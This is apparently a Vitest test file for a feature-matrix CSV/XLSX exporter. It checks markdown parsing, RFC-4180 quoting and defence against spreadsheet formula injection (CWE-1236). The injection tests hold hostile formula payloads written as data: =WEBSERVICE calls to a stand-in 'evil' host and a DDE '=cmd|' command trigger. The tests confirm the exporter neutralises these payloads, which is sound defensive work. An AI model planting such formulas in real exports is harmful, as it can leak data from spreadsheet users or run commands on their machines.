// SPDX-License-Identifier: Apache-2.0
import { describe, it, expect } from 'vitest'
import {
  featureMatrixToCsv,
  featureMatrixToXlsx,
  parseFeatureMatrixRows,
  type FeatureMatrixRow,
} from '../../src/export/feature-matrix-export.js'

function row(overrides: Partial<FeatureMatrixRow>): FeatureMatrixRow {
  return {
    featureId: 'REQ-001',
    capability: 'cap',
    kitDims: [],
    level: 'L2',
    status: 'Done',
    codeRef: '',
    testRef: '',
    docRef: '',
    issueRef: '',
    note: '',
    ...overrides,
  }
}

const SAMPLE_MARKDOWN = `# FEATURE_MATRIX

<!-- FEATURE_MATRIX_START -->
| feature_id | capability | kit_dims | level | status | code_ref | test_ref | doc_ref | issue_ref | note |
|---|---|---|---|---|---|---|---|---|---|
| REQ-001 | Architecture enforcement | N01,N02 | L2 | Done | src/generators/boundaries.ts | __tests__/generators/boundaries.test.ts | docs/PRODUCT/FEATURE_MATRIX.md | | |
| REQ-002 | Static analysis | N13 | L2 | Partial | src/generators/quality.ts | | | #500 | Linting only |
| REQ-003 | Audit trail | N08,N73 | L4 | Missing | | | | #501 | |
<!-- FEATURE_MATRIX_END -->

## Summary

| Status | Count |
|---|---|
| Verified | 0 |
| Done | 1 |
| Partial | 1 |
| Missing | 1 |
| **Total** | **3** |
`

describe('parseFeatureMatrixRows', () => {
  it('parses rows from sentinel block', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows).toHaveLength(3)
  })

  it('parses feature_id correctly', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows[0]?.featureId).toBe('REQ-001')
    expect(rows[1]?.featureId).toBe('REQ-002')
  })

  it('parses status correctly', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows[0]?.status).toBe('Done')
    expect(rows[1]?.status).toBe('Partial')
    expect(rows[2]?.status).toBe('Missing')
  })

  it('parses kit_dims as array', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    expect(rows[0]?.kitDims).toEqual(['N01', 'N02'])
  })

  it('returns empty array when no sentinel markers found', () => {
    const rows = parseFeatureMatrixRows('# No markers here\n\nSome content.')
    expect(rows).toHaveLength(0)
  })
})

describe('featureMatrixToCsv', () => {
  it('produces non-empty output', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    expect(csv.length).toBeGreaterThan(0)
  })

  it('has a header row', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    const firstLine = csv.split('\n')[0] ?? ''
    expect(firstLine).toContain('feature_id')
    expect(firstLine).toContain('status')
    expect(firstLine).toContain('kit_dims')
  })

  it('includes all data rows', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    expect(csv).toContain('REQ-001')
    expect(csv).toContain('REQ-002')
    expect(csv).toContain('REQ-003')
  })

  it('RFC-4180: wraps cells with commas in double quotes', () => {
    const rows = parseFeatureMatrixRows(SAMPLE_MARKDOWN)
    const csv = featureMatrixToCsv(rows)
    // N01,N02 contains a comma — should be quoted
    expect(csv).toContain('"N01,N02"')
  })

  // CWE-1236: cells beginning with a formula trigger must be neutralized so a
  // spreadsheet renders them as text, not as an evaluated formula.
  it('CWE-1236: neutralizes a =WEBSERVICE() note with a leading quote', () => {
    const csv = featureMatrixToCsv([row({ note: '=WEBSERVICE("http://evil.example/x")' })])
    // The dangerous cell contains a comma+quote, so it is RFC-4180 quoted; the
    // payload inside must start with the neutralizing single quote, not '='.
    expect(csv).toContain('"\'=WEBSERVICE')
    expect(csv).not.toMatch(/,=WEBSERVICE/)
  })

  it.each([
    ['=', "=cmd|'/c calc'!A0"],
    ['+', '+1+1'],
    ['-', '-2+3'],
    ['@', '@SUM(A1:A9)'],
    ['TAB', '\tWEBSERVICE'],
    ['CR', '\rmalicious'],
  ])('CWE-1236: neutralizes a leading %s trigger in issueRef', (_label, payload) => {
    const csv = featureMatrixToCsv([row({ issueRef: payload })])
    // Every data cell after the header must carry the neutralizing prefix.
    const dataLine = csv.split('\r\n')[1] ?? ''
    expect(dataLine).toContain(`'${payload.replace(/"/g, '""')}`)
  })

  it('CWE-1236: leaves a benign issueRef untouched', () => {
    const csv = featureMatrixToCsv([row({ issueRef: '#500' })])
    expect(csv).not.toContain("'#500")
    expect(csv).toContain('#500')
  })
})

describe('featureMatrixToXlsx — formula injection (CWE-1236)', () => {
  async function cellText(buf: Buffer, address: string): Promise<string> {
    const ExcelJS = (await import('exceljs')).default
    const wb = new ExcelJS.Workbook()
    await wb.xlsx.load(buf as unknown as ArrayBuffer)
    const ws = wb.getWorksheet('Feature Matrix')
    return String(ws?.getCell(address).value ?? '')
  }

  it('prefixes a =WEBSERVICE() note cell with a single quote', async () => {
    const buf = await featureMatrixToXlsx([row({ note: '=WEBSERVICE("http://evil/x")' })])
    // Row 1 is the header; row 2 is the data row. note is column J (10th).
    const note = await cellText(buf, 'J2')
    expect(note.startsWith("'=WEBSERVICE")).toBe(true)
  })

  it('leaves a benign capability cell untouched', async () => {
    const buf = await featureMatrixToXlsx([row({ capability: 'Static analysis' })])
    const cap = await cellText(buf, 'B2')
    expect(cap).toBe('Static analysis')
  })
})
